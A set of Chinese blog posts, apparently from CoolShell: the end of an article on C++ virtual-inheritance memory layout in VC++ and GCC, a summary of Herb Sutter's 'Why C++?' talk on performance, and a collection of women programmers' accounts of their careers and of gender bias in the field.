cout << "[12] B::ib = ";     cout << *((int*)(&dd)+12) << endl; //B::ib     cout << "[13] B::cb = ";     cout << (char)*((int*)(&dd)+13) <<endl;//B::cb下面给出运行后的结果（分VC++和GCC两部份）!07关于虚拟继承的运行结果我就不画图了（前面的作图已经让我产生了很严重的厌倦感，所以就偷个懒了，大家见谅了）在上面的输出结果中，我用不同的颜色做了一些标明。我们可以看到如下的几点：1）无论是GCC还是VC++，除了一些细节上的不同，其大体上的对象布局是一样的。也就是说，先是B1（黄色），然后是B2（绿色），接着是D（灰色），而B这个超类（青蓝色）的实例都放在最后的位置。2）关于虚函数表，尤其是第一个虚表，GCC和VC++有很重大的不一样。但仔细看下来，还是VC++的虚表比较清晰和有逻辑性。3）VC++和GCC都把B这个超类放到了最后，而VC++有一个NULL分隔符把B和B1和B2的布局分开。GCC则没有。4）VC++中的内存布局有两个地址我有些不是很明白，在其中我用红色标出了。取其内容是-4。接道理来说，这个指针应该是指向B类实例的内存地址（这个做法就是为了保证重复的父类只有一个实例的技术）。但取值后却不是。这点我目前还并不太清楚，还向大家请教。
5）GCC的内存布局中在B1和B2中则没有指向B的指针。这点可以理解，编译器可以通过计算B1和B2的size而得出B的偏移量。#### 结束语C++这门语言是一门比较复杂的语言，对于程序员来说，我们似乎永远摸不清楚这门语言背着我们在干了什么。需要熟悉这门语言，我们就必需要了解C++里面的那些东西，需要我们去了解他后面的内存对象。这样我们才能真正的了解C++，从而能够更好的使用C++这门最难的编程语言。（全文完）# Why C++ ? 王者归来作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn因为又有人邀请我去Quora的C2C网站去回答问题去了，这回是 关于 @laiyonghao 的这篇有点争议的博文《2012 不宜进入的三个技术点》ActionScript，Thread 和 C++， C++争议的争议最大。（要我说，.NET比C++更需要慎重进入，呵）。我就在这里回复一下这个问题吧。正好我一个月前看到一个视频，这个演讲视频还比较著名，这个演讲者是 _Exceptional C++_ 和 _C++ Coding Standards_ 的作者，还是ISO C++ 委员会的Chair，C++/CLI首席架构师，还是Microsoft的软件架构师，他叫Herb Sutter，他的这个演讲视频是 C++ and Beyond 2011上的一次公开演讲，题目是——Why C++? （如果你觉得那里的视频比较慢，你可以看优酷上的视频）（英文听力好的同学可以看一样，因为都没有中文字幕）
我觉得这篇文章就足够可以说明很多问题了，所以，我把Herb的演讲幻灯片截了几页放到这里，并做上一些注释，算是一个演讲内容摘要吧。1） 为什么C++？因为 Performance per $，也就是说performance 就是钱，这个分成三个方面，* 耗电，芯片的耗电量，移动设备的耗电量，家用电脑的耗电量都和钱有关系。   * 资源，家用电脑和移动设备上的处理器资源有限，因为要让一般消费者买的起。   * 体验，在更小的设备上会有更好的体验，有更好的体验就可以挣更多的钱。移动设备上的耗电量相信用过智能手机的人都知道吧，Android手机的耗电量实在是太大了。就算是iPhone在开启Wifi和3G的情况下耗电量也很快。2）C++的进化分成三个时代：* 1979 – 1989：研究C的对象能力。主要是为C++做准备   * 1989 – 1999：C++成了主流。   * 1999 – 2009：Coffee-based语言（Java, .NET）出现了，极大的提高了开发生产力。对于第三个时代，Herb说了很多，他说这个并没有什么错，因为这个时候我们非常关注开发的生产力，这个非常重要，这就是为什么C++一下就失去优势的地方。但是是否这些Coffee- Based的语言可以做任重要的事呢？不行，很多时候，这是一个Trade-Off的事，也就是生产力不是免费的是需要你用别的东西去交换的。
3）第四个时期。Herb认为，2009-2019是第四个时期，因为我们又喜欢Native Code了，C++从被驱逐后又被请回来了。因为网站的性能越来越是个问题，移动端的设备非常流行。但主要是因为Performance就是钱，因为前面的三个因素，性能影响的是dollar，不尊重性能的公司都会发现花钱的速度太快了。（比如去年大家热炒的京东促销和12306.cn的问题，12306给整个社会造成了巨大的金钱浪费）Herb把这个时期比做 The Return of the King。（指环王的第三部：王者归来） **性能为王！**这就好像我在“软件开发的三重门”里说的，开垦时代需要的是快和生产力，而开垦完后就得保证其稳定性。4）Herb还给了一张幻灯片问，“The World is built on ….”，后面例出了多个语言。然后Herb说，世界是由C和C++构成的。5）Herb给了一张表格，这张表可相当形像。如果把我们的对编程语言的需求总结为四个： **效率，灵活，抽象，生产率** 。那么，C语言玩的是前两个，而C++玩的是前三个，Java和C#玩的是后两个（抽象和生产率）任保一种设计都不可能让你什么都要的，这就是Trade-Off——什么事都需要交换的。
6）Herb举了一个微软内的例子，用C++ 和 ATL 来开发IE工具条的报告，意思是你可以用脚本在IE的工具条上加按钮，但是作者建议使用C++，因为用.NET或是脚本有重大的limitation，尤其是性能上的问题。7）接下来，我们来看看移动设备。下图中，第一个是iOS，第二个是Android，第三个是WinPhone。Herd说了几个事：a）比Web APP，人们更喜欢Native的APP，这个在用移动设备上可以得到验证。b）iOS也好，Android也好，WinPhone也好，他们不是在搞操作系统，而是在搞应用，为的是让智能手机更好。手机就是一个App。c）这三个手机在第一版出来时都不支持C++，而第二版出来时都支持C++了。因为他们要兼顾性能和一定程度上的开发效率。WinPhone还没有到第二版，让我们拭目以待。（我以前写过一篇调侃Android支持C++开发的文章，这也只是一年前的事，说明C++全面回归了）8）如果你还是不相信的话，我们可以看看为什么Apple和Google都在搞C++的编译器，因为他们觉得g++性能不行。所以，基于LLVM的编译器正在领导潮流，因为我们关注Natvie Code的性能优化。
9）接下来，Herb说了一下数据中心，你知道数据中心最花钱的是什么吗？三个事：>   * 57% 花在了硬件上。 >   * 18% 花在了配电和降温上。 >   * 13% 花在了耗电上。 >88%的钱花在了硬件和电力上。这可是很大一笔费用啊。（还有人说硬件比软件便宜吗？）我记得我上一个公司的数据中心每年要花的电费就在百万美元以上。10）昨天在微博上有个笑话，说是某咨询师要求程序员把代码打印出来走查，程序员问是不是要用彩打？哈哈。我说，这至少不环保嘛。消耗太大了。是的，C++是可以省电的，以及于C++之父都在YouTube 说C++是可以减轻全球变暖的问题。哇，C++开始真正造福人类了。11）我还需要重温一下老大的这句话——> **My contribution to the fight against global warming is C++’s efficiency** > : Just think if Google had to have twice as many server farms! Each uses as > much energy as a small town. And it’s not just a factor of two… **Efficiency > is not just running fast or running bigger programs, it’s also running using > less resources**. > > Bjarne Stroustrup, June 2011
最后一句说的非常好！ **效率不仅仅只是跑得，跑得多，更是可以使用更少的资源** 。12）下面让我们再来看一张表，一张把钱投到哪里的表格，这样我们可以看到一些趋势。* 70年代80年代，资源不够，主要是把钱投在性能上。   * 80年代到90代，主要是90年代开始有一半的投次到了抽象和生产率上。   * 00年代，完全都在抽象和生产率上。   * 10年代，80%的钱都要回头来解决性能问题。这就是C/C++的王者归来。13）当然，不是C++不注重 开发效率，看看C++0X的标准引入了多少东西我们就知道了。但是本质上， **C++还是致力于性能和抽象的完全平衡** 。那么，我们还会觉得C++要被淘汰了，不适合进入了吗？看完这个演讲，你应该有答案的。后面讲了C++的文艺复兴，你可以在Google 搜索 “C++ Renaissance”看看。另外， **该视频的讲议可以在这里下载**。（全文完）# 程序员因为女孩而美丽！作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**女程序员是程序员里美丽的风景线，我希望这些女程序员的经历能让我们** **在这个“重男轻女”的社会中可以给女程员有更多平等的机会和条件，以及相应的尊重** **。** **因为，她们其中不乏优秀的程序员，而且在心态、态度和努力上还强过很多男性程序员，很多东西都值得我们大家 **向她们学习**** 。
这篇文章的来由是因为Eva在“三个事和三个问题”的评论里问我女孩子是否能做技术，她说她的很多师兄都告诉他不要做技术，所以，她有些不坚定了。我的回复是告诉了她我工作经历中的两个技术很牛的女孩，并且我从她们身上学到了多技术。但是，后面有一些人回复说我误导了别人。所以，我在新浪微博和twitter上征集女程序员的故事和想法。我一共收到了19封邮件，其中有17封邮件来自女程序员。其中有一个已经发布了（一个女程序员的故事），其中的一些观点已经在网上传播，并得到了大家的刮目和称赞。但这并不是特例，因为下面的这些故事中，还有很多令人刮目相看的东西。**说明** ：先说明一下，这篇文章并不想讨论女孩子是不是适合做技术，这不值得讨论，因为，在“一个女程序员的故事”中我们已经知道，态度和努力才是原因，而不是性别。这里，也只是想告诉那些有“性别歧视”、“看不起女程序员”、“骄傲自大”的男程序员们，那些女程序员不为所知的一面。 **我把几乎所有的故事都列在这篇文章里了，我觉得我不用再多说什么了，这些故事组成的风景线，可以让你充分地了解女程序员** 。!Ada Lovelace 世界第一个程序员Ada Lovelace 世界第一个程序员
在看到那些故事之前，我们需要了解这样的现实——* **大多数女孩子并不喜欢技术** 。这点从我们的计算机专业的学校就可以看到了。我上大学时，两个专业60个同学，有15个女生，男女比例已经失衡。不过，这些女生今天基本全部都还在做技术。现在，十多年了，她们其中女生还在各个公司的技术部门，主要做 开发和运维。这些是70后的女生。对于80后和90后的女生来说，可能喜欢技术的就更少了。Gavin在来信中说：“我们学院每届大约有800名学生，也就是说每年整个计算机学院只有大约50名女生。在这50名女生中，据我所知有至少一半的女生从开始到最后对编程一点兴趣都没有，这一半的女生有的准备跨专业考研，有的在考公务员，有的去了跟计算机专业几乎不沾边的行业去工作了，有的在大二的时候就已经开始修双专业了”。不过，在这里我们来看看做技术的女孩子是什么样的。* **女孩子在找工作的时候总是会被歧视** 。很多用人单位都会问女孩子生孩子的问题，这简直就是干涉隐私和性别歧视，要在西方国家里，完全可以对这样的公司进行起诉。对于这种不尊重女性的公司，无论男女，一定不会尊重员工的。所以，这样的公司一定不要去。而很多女孩也会觉得结婚生子后就不能再从事技术了，所以，她们也对技术行业的未来没有信心。 **Myma** 在来信中说：“女人做技术最怕就是世俗的偏见，尤其是过了30，生了孩子，明显感觉出来了，职业瓶颈”。 **召娣** 说：“面试的时候会问有没有男朋友，下一步会不会结婚，接下来就是会不会要孩子之类的”，几乎所有的女程序员都在说这个事。
* **自大的男程序员看不起女程序员** 。女程序员在工作中受到太多的不公平的待遇了。就连平时男程序员们都以一种高人一头的语气和她们说话。这样的例子太多了，在我blog中的回复中，在平时，我们都可以看得到。而我们的大多数的女性都会因为别人看不起而失去信心。当然，这点男程序员也一样，因为技术好的人总是会看不起技术不好的人。这是技术人员的通病。 **冰** 在来信中说：“另一个困扰的问题是，可能女生少的原因，在本部门风言风语不断，给我个人生活不少的精神压力，平时同事也会半开玩笑的说，嫁了吧，写什么代码，而且跟一些比较资深的程序员聊天时，总会呵呵的轻笑，然后说你是程序员啊。。。部门一些杂务，通常都扔了给我处理，这个我觉得吃点亏也没什么大事，但是就是忍受不了那种受轻视的感觉”。 **Cathy** 说：“项目组的组长是一个博士，人很好但是不太会和女孩子打交道，或者说有一些性别歧视吧。”但是这些现实中的东西，对于我们的女程序员来说算不了什么！不信，你看看他们的故事。 **至少你会发现，做技术的女孩一点也不浮华** ！目录* 女程序员的故事     * 程序员因为女孩而美丽！     * Shaofei – 妈妈是个程序员     * zxy_snow – 半女程序员流水账     * 璀璨 – 时刻准备着     * 冰 – coding是我们的共同语言     * Maya Maya – “左手代码，右手诗”     * Joyic – 只要努力，一切皆有可能     * 叨叨 – 为了忘却的纪念-我在恒生的七年     * Kelan – 在coding和修复bug中享受无限的快乐和价值感     * WaterMask – 踏踏实实的做coder，每天写好每一行代码     * 禾禾木木 – 女程序员的路可以很长     * Bana – 我是一名女程序员 我无怨无悔     * Cathy – 一个非典型的女程序员的曲折经历     * Linn – 误打误撞的程序员     * Nana – 做喜欢做的事，所以很开心     * Gift – 当一名战士就是一支军队，那些软件不需要工程的时候     * Zheng – 永不放弃程序员的工作     * 女程序员们，为你们骄傲，祝你们2012年更上一层楼。
#### 女程序员的故事下面的故事，都是原文，没有经过任何编辑。下面的故事，很多也很长，她们串成了一个非常美丽的风景线， **我真的希望你有空能读一读这些故事。你会发现这些故事都有我们自己的身影** 。真的非常感谢大家对我的信任，给我发来这么多的故事，谢谢你们的支持。我完全相信——##### 程序员因为女孩而美丽！##### Shaofei – 妈妈是个程序员1.我老妈是程序员，老朽今年二十有七了，可以想象年龄。2.她20来岁的时候，背着全部门写的程序——一卷打孔纸带去北京上机调试，要排机时，还要给重要的项目让路，改程序么，就是把纸带剪断，用胶粘一段上去之类的。3.她们那个时代的程序员都是直接读机器码的，大约就是5665表示begin之类的东西，而且是用打孔纸带二进制表示的，嗯，小时候有印象，她读程序就是站在床上一手拿着纸带卷，另一手抽着读，读过的就拖到地上。4.好吧，那个时代的程序员应该坚持到现在的不多，很遗憾她中间也转了管理又转了市场，后来创创业也没成，于是现在待在家里悠闲。##### zxy_snow – 半女程序员流水账自我介绍下，女，大三，某高校软件工程专业。我想，严格意义上来说，我还算不上女程序员吧，还是一个弱弱的学生。
接触程序还是在大学开始，或者说，大一下接触ACM 之后吧。当初和朋友一起做ACM，这一年半，不停地学算法、刷题，也成就了一个水题博客（我的CSDN密码??），交到了很多其他大学的朋友，人外有人，深知这句话的意思。虽然算不上太聪明，不过不笨，另外，还算坚持，想想搞ACM 的时候，经常攒着电影没时间看放寒暑假回家看，看一个电影都能刷个题了都。现在想想，那些日子真的很开心。吃饭的时候可以想想，啊，这个应该用这个算法，和朋友们出去的时候可以一起讨论。用学长的话，有一个你可以一直在脑袋里想的问题，多好啊！庆幸自己遇到了ACM，做自己喜欢的事情，尽自己全力，在大学阶段，真的很难   得。毕竟大学之前，就像机器一样，大家都这么做，我也就这么做，但是大学之后，是完全靠自己想法行动的，无论做什么，都是自己的意愿，这样很有成就感。还记得，大二的时候，是好孩子，不想逃课，就印了题、算法、论文去课堂上看，看懂后果断逃课回去敲代码，哈哈，不是个好孩子呢！翘了不少课。寒暑假总被老妈说，说别学了，出去玩玩，哈哈！如果她知道我学的和课业无关她会不会还这么说，嘻嘻！今年的11 月，区域赛结束后，算是告别ACM，开始踏上了网络方面的不归路。确切的说，是因为需要做课程设计。我用了俩星期从J2EE 啥也不懂然后和朋友们完成我们的项目，很开心。我想，这些学习能力、代码能力是ACM 给我的。开始一个完全未知的领域真的好难啊，各种不懂，我的“to learn list.txt”一大堆东西，慢慢来吧，近期把JS 的基础视频看完了，《正则表达式必知必》会看完了，struts2 视频正在学，寒假还有各种任务呢！哈，想想寒假我都好兴奋，寒假学习效率会很高的。当然，先应付完期末考试。引用另一位学长的话，搞ACM的要当学霸！优秀应该是各个方面的。
这次寒假的主要任务是做学校的在线测评系统，怎么说呢，我觉得这是又一件我真心想做并且想把它做得完美的东西。这样的感觉很少有了，但是这次，我真心想把它弄好，所以学架构，写需求分析，数据库设计，学各种需要的知识，但是总感觉，学得越多，自己越需要学的东西就越多，不过，只要开始学了，就有进步的。不知道符合要求不，似乎又写了一篇流水账，所以说我觉得我还不算是程序员，不过未来很希望成为一名程序员，写代码多开心呐！##### 璀璨 – 时刻准备着我：大四在一家叫食草堂的公司做网络管理及网店运营，但基本用不到专业知识。毕业后男朋友坚持不让我再随便找工作，他一个人挣钱并供我去学习java语言，学习了8个月找到了一份做ip网管软件的公司，男友在一家培训机构做教师，后来渐渐觉得不快乐不充实，被封闭在这样的空间内，不能去接触新技术新人，视野渐渐狭窄。于是我们一起辞职从天津来到了杭州，只面试了一家就来上班了，当时觉得自己能力有限，不应该是我挑工作。。。在这里做手机阅读网站，接触不到数据库，我们负责的是中间层，将数据从接口取出展示在页面上，由于我工作积极主动活泼开朗，喜爱解决疑难杂症，又爱组织这个那个的，PM将我提升为开发组负责人，但是转眼一年多过去了，我并没有觉得有成就感，相反觉得自己在技术上一事无成、在管理上又不专业，不想走管理的道路。这一年来我和男友去上海参加了几次技术大会，每回回来都会热血沸腾，我工作很忙又懒惰，导致技术水平一直无法提高，很多书都没看。每天都有强烈的自责感，但又觉得没有学不会的东西，所以就无法放弃。也因为自己对技术能力表示质疑，不敢去大的公司应聘，导致现在总是时刻准备着。。。
回想这些年，我心中所树立的理想、信念，我对it行业的向往、甚至我现在的自责感，都和男友对我的影响有关，他的眼界和思考能力要远高于我认识的人，所以有时候我想我的某些思想是依赖于他的更新而更新的。是那种容易被别人感化的人。说说其他的女程序员吧，她们之前的人生经历我不说了，就聊一聊我认识的几种女生在工作上的类型吧。我的同事A：刚毕业没多久的小女生，我每天从男友那里或者我自己这里获得的最新新闻和哲理我都会讲给她听，她认真听，回去也看书，每次都会骄傲的对我说又看完一本了，但技术始终上不来，这大概是那种应试教育下的女生代表类型，就像我们计算机系当年得前三名的女生一样，在实际工作后比不上倒数几名的男生。我的同事B：已经做妈妈了，工作出色，考虑事情全面，只是她的生活完全和世界脱轨，新事物几乎不接触，新技术也是，但是如果工作用到她会积极去学，并且能把工作做好，对未来没有规划，过好日子就行。我的同事C：毕业时是C的佼佼者，毕业后一年多就落后了，被爱情和无聊的日子所累，也总是自责，但找不到学习的方向。看过这么多女程序员的状态，对于自身没有坚定信念和方向的我们来说，我觉得工作环境真的很重要，每天身边是什么人在交流，是什么人在一起工作，团队氛围如何，都会潜移默化影响着每个人，自身的努力和态度也固然不可忽视。
##### 冰 – coding是我们的共同语言昨天见到了你的关于女程序员的征文，也趁着年末，给个小小的回顾自己吧。也算不上什么经验，只是谈下个人经历感受。上大学第一天就知道，班里面只有4个女生，但也并没有任何特殊优厚待遇，一般开什么班会，都是女生迁就男生，大老远跑他们那边去开会，常感受到的是，特别容易被老师或同学质疑，这个是你做的吗？你完成上机实验了吗？要独立完成等等。。。印象比较深刻的是，有一次，电脑坏了，找男生修，结果他说身为计算机专业的女生，连个都不会，在以后的日子里，我就没有再去麻烦过他，也许他们是那些所谓的Geek，但我理解不了这份傲慢，牛人多的去，尤其在我现在工作的公司，一位资深架构师，不论问题大小，都会给你很好的解答，并进一步发散问题，每次聊天都受益匪浅。当然这些也只是少数，大学里面是最好的学习环境，而且很奇怪地，我发现，学习好的女生，都是在一个宿舍，而不学无术的，又会在一个宿舍，工作以后，大半都没有再从事计算机方面的工作了，要么考个公务员，要么做个辅导员，或去个银行什么的。同生同是，一个宿舍里，好像就是一场编程的竞赛，谁更努力，谁更有资本炫，也许这是学习的动力。说下出来毕业出来找工作，当时确实茫然，展望整个专业，本来就女生不多，还有大半都去考研考公务员等等的，觉得自己出路在哪啊，男生这么优秀，你凭什么跟他们一拼高下，一次又一次的经历招聘会的沮丧，信心都快打击光了。后来，收到了第一个offer，就马上把自己卖了，这也是我的第一份工作，我是09年毕业的，当年市场确实也不怎么景气，有好些同学，都是在年末才找到工作，甚至先去上了个什么一万多的达内啊青鸟啊之类的软件培训课程。
上班之后，也没多好受，原来老大当初把我招进来，有一个原因是想解决下公司内部单身男士的需求，给我的一般是轻活，自然奖金工资总比同进来的男生少（私底下交流过），自问没做得比他们少。值得庆幸的是我跟了一个不错的组长，他会给跟老大提出要求，可以给我安排些挑战性的任务，由于过去一年确实也收获不少，虽然不是在金钱上，一直比别人努力希望能纠正老大眼中的我是花瓶的感觉。同时，另一个困扰的问题是，可能女生少的原因，本人有几分姿色，在本部门受不少人追，风言风语不断，给我个人生活不少的精神压力，平时同事也会半开玩笑的说，嫁了吧，写什么代码，而且跟一些比较资深的程序员聊天时，总会呵呵的轻笑，然后说你是程序员啊。。。部门一些杂务，通常都扔了给我处理，这个我觉得吃点亏也没什么大事，但是就是忍受不了那种受轻视的感觉。处心积累了一年半，跳离了这个是非之地，目前在工作的公司。终于呼吸到新鲜的空气，现在整个开发团队，只有我一女的，开会什么的我就显得特别突出，办活动或者聚会什么的，总不能太融入他们，他们一帮程序猿，辟酒通宵桌游聊天，我总不能也凑上去喝个烂醉吧，活动吧，他们篮球啊足球啊，我根本掺和不上，剩下的就是大家吃个饭，感情上总是欠缺一些，但是他们都很照顾我和接纳我，也教会我了用很多的工具，大家总以邮件形式来分享代码中遇到的抽疯问题，白痴陷阱，即使错了也没关系，反正就是可拍砖可嘉奖，气氛相当的学习火热型。
另外一样是，coding我们可能有共同语言，但退下工作后，基本上，跟一群男程序猿聊一起很难话题不多，偶尔遇到一两个话多一些风趣一些，其他都是木纳得很；而作为女性，当然会爱逛街爱八卦爱打扮，但同学已经各散东西，同事中没几个女的，生活已经没有几个女伴一起做女生爱做的事，而且，上班时，我总是小心翼翼不能穿得太性感，不打扮，怕会遭人闲语。呵呵。本文就一啰嗦。莫见怪。##### Maya Maya – “左手代码，右手诗”从小我喜欢画画，喜欢文学，上大学的时候，听了家人的意见，报了计算机，从此理想和现实分开。我大学毕业已经10多年了，当年毕业进了高校当老师，两年后为了爱情放弃舒适的生活来到北京北漂，对计算机不是那么爱好，开始做测试，后来转作网站开发，和互联网结下了不解之缘。互联网是节奏很快的公司，虽然自己年纪大了，可是和年轻人在一起，觉得自己心态还很年轻，哈哈~说起做技术，也是满腹心酸，刚到北京，一个小公司，老板不懂，今天说给我开发一个无纸办公室软件，明天那个，那个时候晚上下班累的洗脚时躺着就睡着了。可是自己没有放弃，逐渐喜欢上了技术，后来去了一家公司，有个大师级人物，虽然大家都说他性格古怪，可我和他相处很好，他算是我一个师傅，和他2年多，自己技术提高了不少，做技术的兴趣也多了很多。最苦的时候加班两个通宵，除了公司坐上出租车就睡着了，但是心里很充实很开心。
女人做技术最怕就是世俗的偏见，尤其是过了30，生了孩子，明显感觉出来了，职业瓶颈。不少人劝我找个轻松的工作，可是我还是没有放弃，还在坚持，不是为了为了养家糊口，为了自己的心愿吧。我做事喜欢亲力亲为，每次招聘约小孩面试，他们都问我，你是助理吗？面试结束，小孩们又说，女的做技术很少的，做技术的女领导应该很严格吧。其实对于别人的任何看法，我从来都是笑笑不语，我带团队，总是希望新人能在我这里学到东西，走的时候能上一个更高的台阶，因人而异给他们提供机会。互联网发展快，我自己也要学习，不然就跟不上，我每天很早来公司，晚上也走得相对晚些，下班了才有自己时间看点东西，上班琐事太多。顾了公司顾不了家庭，回家是孩子睡了，老公一脸的不高兴，生活或许如此，不能尽善尽美。任何事情都有游戏规则，既然选择就要遵守。互联网的泡沫其实很多，我经常给刚毕业学生说，30岁之前不要看钱，而是给自己长本事，积攒资历。发现在线小孩浮躁的很多，很难静下心来认真做一件事情，总是看着别人的薪水多高，看别人的收获，却没看到别人背后的付出。程序员给人感觉都很闷，可是我喜欢读小说，红楼梦最爱，很喜欢惠新宸的那句话：“左手代码，右手诗。”##### Joyic – 只要努力，一切皆有可能
看过“一个女程序员的故事”这篇文章，很有感触。我是2010年的硕士毕业生，也是个女生，和故事中的女主角比起来，我的故事其实才刚刚开始。或许平淡，但希望能给即将找工作，还在徘徊和犹豫的学弟学妹们一些鼓舞。经历的小学和初中的辉煌，经历了高中的低潮，我进入了一所211本科，不是985，一所不上不下的大学，专业是信息管理与信息系统。这个计算机相关专业让我接触到了C语言，数据结构，Java，Web编程以及数据库，我发现自己从来没对哪些课程有如此大的热情，这些热情带给我的动力以及对知识的渴望，换来的不仅仅是优异的成绩，最重要的，让我拾回了高中三年几乎丧失殆尽的信心，我又开始相信自己。转眼大四，与保研失之交臂，考研又没能进入理想的学校。又一次进入了一所不上不下的211学校，一切似乎又回到了原点，这次的专业是软件工程。不幸中的万幸，我还没离开自己喜欢的专业。研二的上半年，我得到了导师的一个横向项目，给四川的某出版社分社做一个信息管理系统。这是我得到的第一个锻炼机会，用的是最简单的jsp+servlet技术，系统结构不复杂但内容很庞大（就一个dev来说），我一个人硬着头皮码了十几万行的代码，需求、开发、安装、调试、培训一个人从头干到尾，中间多少次我都觉得自己做不了了，要放弃了，这个功能我完不成了，没时间了，咬咬牙，全过来了。现在想想，这个系统错露百出，但它使我完成了从无到有的涅槃，不再是看看书，写个百十来行的练习，是真正做出来个东西。
完成了这个项目，对自己的信心又增强了。我有了下一个目标，找个实习，去IBM试试！以我所在的学校，能拿到IBM实习offer的人凤毛翎角。“应届生”网站上随时会有IBM招intern的消息，我的简历因为有了刚刚做过的这个项目，基本都能得到电话面试的机会。当时我的知识面还很窄，加上没有为面试好好复习过基础知识，屡试屡败，有时拿到面试也是铩羽而归。“WSDL是什么？”，“你对SOAP有什么了解？”，“设计模式你熟悉么？”，“解释一下Spring的依赖注入”一次次的失败也指引了我学习的方向。不会我就学么。至少面了5个team，我终于拿到了IBM的offer，当上了intern！现在想想，这个时刻带给我的喜悦甚至超过了我毕业真正找到工作的时候。我再一次给自己画了一条遥不可及的线，再一次把自己扔了过去。实习了不到一年，让我学到了很多，也适应的外企的工作环境。开始真正的找工作了。有学校的项目和IBM实习经历，我的简历更加丰满，加上自己经历多次intern的面试，积累了一些面试经验，很顺利的，我拿到了Oracle，IBM和我现在公司的Offer。工作到现在工作一年多了，有过一次promote，也得到了一次出国培训的机会。真正的工作中，我的技术和工作过3、5年的同事尚有差距，我把很大一部分精力放在了解业务上，通读了产品所有的design文档，对架构及所有workflow了然于心，专挑一些别人不愿碰的硬骨头，亦因此建立起自己在team中的reputation。
最后，我想说，我身边也有在学校的时候就能写出操作系统的牛人，我也是无比尊敬和仰慕着他们。作为一个热爱着编程又天赋一般的普通人，没有清华北大北航北邮…的好出身，也没有根红苗正的计算机科学与技术专业背景，一步步的走过，被兴趣爱好还有自己的执着指引至今。给向往着大公司的学弟学妹们，可能你的学校使你没有运气在面试的时候发现面试官刚好是自己的师兄师姐，但只要努力，一切皆有可能。给我的老师和帮助过我的同事，你们引领我一步步走进了这个行业。还有我相伴7年的男友，我还记得大学的时候我们打电话时讨论技术，宿舍姐妹们看我的眼神儿。哈哈哈。##### 叨叨 – 为了忘却的纪念-我在恒生的七年**叨叨的博客**    http://blog.sina.com.cn/u/1892569084强烈建议大家看看这个连载，你一定能从中看到很多东西的* **前传**   * **初出茅庐（上）**   * **初出茅庐（下）**   * **初露锋芒（上）**   * **初露锋芒（下）**   * **一波三折（上** ）（本文发布时，这个故事还在继续中……）##### Kelan – 在coding和修复bug中享受无限的快乐和价值感
我是一名入职不到一年的女程序员，很幸运，能进入一家知名的互联网公司做web开发，用的Java。我记得当时面试的时候，我在技术上毫无优势，公司要用到的很多框架，我都没有使用过，只是听说过，知道一点点概念，但是过了两个技术面，面试官很nice，觉得我有潜力。第三面是HR面，当时HR问我，为什么要做技术，我当时思都没思考就回答：喜欢！我一直很惊异这个答案，也许，那是一个连我都不敢相信的真实的答案。我在的team里面，就我一个女生，又是最小的，大家相当照顾我，在工作上给与了我很大的帮助，不得不提的是，我不仅遇到了一个很和谐的团队，还遇到了一个打着灯笼都难找的boss，对于这一点，我觉得也许是上辈子积了德，呵呵呵。也正因为他们对我很好，我在工作上不敢懈怠，我知道我基础很欠缺，我不想因为这个影响到整个团队。我会主动的去学习相关的东西，但是，从前的一些经历，让我对自己很不自信，当我看到同事游刃有余的处理工作，讨论技术，研究业务的时候，我很羡慕，同时也觉得自己很苍白，不知道何时才能和他们一样，同时也很害怕让他们失望。很多人都觉得女生就该做像女生的工作，比如hr，比如行政，做技术也可以选测试…我也有过疑惑迷茫的时候，不知道未来的路如何走，也想过自己是不是选对了职业的方向。但我不得不承认，coding和修复bug后给我带来了无限的快乐和价值感，那种感觉很好很好。
我没有太多的分享工作经验，只是想说说自己的迷茫。我从前一直觉得，要做技术大牛才是技术人员的目标，而技术大牛四个字，我望尘莫及。我很堕落的想过，我可不可以不做技术大牛，我就写我的代码，去实现各种业务流程，做一个平凡的程序员，这样算不算不思进取？我看了你分享的文章后，觉得我的想法也许没有那么不堪，每个人都有选择成为哪种人的权利。既然现在的我喜欢code，那我就写好每天应该写好的code，至于以后，那是以后的事了。我觉得，也许很多女程序员和我有相同的困惑，不知道，有谁可以解惑？言语有些乱，因为最近也被这些问题烦扰。但我还是想给自己一个机会，在技术领域，至少五年，如果真的不适合，我放弃，去选择另一种人生；如果相反，呵呵呵，那我真是很幸运，从一开始就选对了路：-）##### WaterMask – 踏踏实实的做coder，每天写好每一行代码偶也是个女程序员，看了cool shell上的blog，发现同自己想法一样的人很多，我也想说说自己的事情。（可能会有点长，如果您能读完我会很荣幸，因为一直都是我读你的blog来着么，呵呵~）我是09届毕业生，加上实习时间也不过3年不到，所以还是个新手。毕业那年正赶上金融危机，就业形势一片糟糕。对于非名牌大学的我来说，简历通常都是石沉大海。身边的同学如果自家有门路的基本都舒舒服服的实习了或者考公务员什么，心里不是没有憋屈的。虽然自己家里也不是一点门路也没有，但是我还是想能靠自己的能力找到工作。（工作到现在我发现，做IT的都不喜欢走后门，大家都靠自己的实力面试工作之类的，恩~所以我更爱这个行当了~）
我的专业是计算机科学与技术，所以除了程序员，我基本没有想过要做别的职业……不晓得为什么当时我会这么想实习的第一家公司是在一家展会公司做网管。公司在市中心的高档办公楼，只有一个hr面试我，没有任何的技术问题。接到录取电话的时候，还是开心极了，因为那时候简历投的基本要发狂了。之后去那边上班才发现受骗了，那家公司其实就只有一个部门——电话销售部门。所有的人每天都是不停的打电话做推销（原来那些成堆成堆卖客户资料的人都是卖给这种公司了……居然还有电话过去找的那人死了好多年的……）。于是我干了没几天就走了。沮丧的很，本来以为是难得的实习机会。因为知道自己其实除了计算机系毕业的外，连真正的代码也没有敲过几行，对于自己想干什么能干什么都很模糊。当时甚至觉得如果有一家软件公司肯要我，给我一个学习的平台，我工资也可以不要的……之后我认真修改了简历，也去了几家公司面试，不过可能因为技术方面太贫乏，都没有公司有回音。除了再接再厉外，我也没别的方法。正好当时学校里已经没有课了，只剩下毕业设计，于是我有大把的时间出去找工作。最后拿到offer的是一家民营公司，专做外包的。（虽然当时我对外包这次词其实不是很理解）我只能说我的运气很好，这家公司的hr是个很nice的姑娘，通过笔试面试之后，她还和我聊了很久，问我为什么非要做程序员之类的，而我也破天荒的说了很多心里的想法。（应届生面试总会事先准备一些问题和答案，有些可能会有点冠冕堂皇）。我记得我跟她说我觉得写程序应该是一件充满想象力和创造力的工作，我喜欢当完成一段代码像完成一件作品一样的成就感。面试完之后，我其实没想过会被录取，只是觉得把心里面的话说出来了，觉得很舒服。过了不久就接到去上班的通知了，心里是非常愉悦的，这次是真正的程序员了！
